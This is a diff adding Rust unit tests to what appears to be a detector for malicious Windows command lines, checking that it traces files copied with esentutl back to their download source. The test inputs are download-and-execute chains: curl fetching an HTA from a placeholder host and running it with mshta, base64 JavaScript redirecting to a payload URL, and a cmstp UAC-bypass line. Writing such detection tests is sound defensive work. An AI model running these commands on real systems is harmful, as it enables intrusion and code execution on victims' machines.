@@ -14190,6 +14190,45 @@ C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/
     }
 
     #[test]
+    fn esentutl_preserves_download_source_for_later_execution() {
+        let report = analyze(
+            br#"curl -o original.hta https://esentutl-copy-download.example/payload.hta
+esentutl /y original.hta /d C:\Temp\renamed.hta /o
+mshta C:\Temp\renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\renamed.hta"
+                            && url == "https://esentutl-copy-download.example/payload.hta"
+                )
+            }),
+            "esentutl copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn esentutl_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXNlbnR1dGwtY29weS1qcy5leGFtcGxlL3BheWxvYWQn")) > original.js
+esentutl /y original.js /d C:\Temp\renamed.js /o
+call C:\Temp\renamed.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://esentutl-copy-js.example/payload")
+            }),
+            "esentutl copied generated JS was not scanned on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmstp_au_direct_command_emits_uac_bypass_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
